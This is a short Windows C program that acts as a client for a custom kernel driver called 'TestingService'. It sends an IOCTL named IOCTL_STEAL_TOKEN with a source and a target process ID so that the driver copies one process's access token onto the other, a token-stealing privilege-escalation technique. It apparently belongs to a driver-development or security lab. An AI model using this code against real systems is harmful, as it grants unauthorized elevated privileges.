#include <windows.h>
#include <stdio.h>

// IOCTLs
#define CUSTOM_DEVICE 0x8000
#define IOCTL_PRIORITY_DATA_ONE CTL_CODE(CUSTOM_DEVICE, 0x801, METHOD_NEITHER, FILE_ANY_ACCESS)
#define IOCTL_PRIORITY_DATA_TWO CTL_CODE(CUSTOM_DEVICE, 0x802, METHOD_NEITHER, FILE_ANY_ACCESS)
#define IOCTL_STEAL_TOKEN CTL_CODE(CUSTOM_DEVICE, 0x803, METHOD_NEITHER, FILE_ANY_ACCESS)

struct PIDData {
	ULONG ulTargetPID; // PID to change the token of.
	ULONG ulSrcPID;    // PID to steal the token of.
};

int main( int argc, char *argv[] )
{
    if ( argc != 3 ) {
        printf( "Need PID of process to steal (src), and PID of process to change (dst)\n" );
        exit(1);
    }

    ULONG ulSrcPIDArg = atoi(argv[1]);
    ULONG ulTargetPIDArg = atoi(argv[2]);

    printf( "[+] SrcPID = %u\n", ulSrcPIDArg );
    printf( "[+] TargetPID = %u\n", ulTargetPIDArg );

    printf( "[+] Opening handle to \\\\.\\TestingService\n" );
    HANDLE hDevice = CreateFileW(L"\\\\.\\TestingService", GENERIC_WRITE, FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf( "Failed to open device = %d\n", GetLastError() );
        exit(1);
    }
    // printf( "[+] hDevice - 0x%X", hDevice );

    // Create data to pass to the driver.
    PIDData CustomData;
    CustomData.ulSrcPID    = ulSrcPIDArg;
    CustomData.ulTargetPID = ulTargetPIDArg;

    // Use DeviceIoControl to send CustomData to the driver.
    DWORD returned;
    printf( "[+] Sending PID IOCTL\n" );
    
    BOOL success = DeviceIoControl(hDevice,
        IOCTL_STEAL_TOKEN,               // Custom control code/IOCTL
        &CustomData, sizeof(CustomData), // input buffer and length
        nullptr, 0,                      // output buffer and length
        &returned, nullptr);
    if (success) {
        printf("[+] DeviceIoControl with IOCTL_STEAL_TOKEN succeeded\n");
    }
    else {
        printf("[!] DeviceIoControl failed\n");
    }

    CloseHandle(hDevice);
    return 0;
}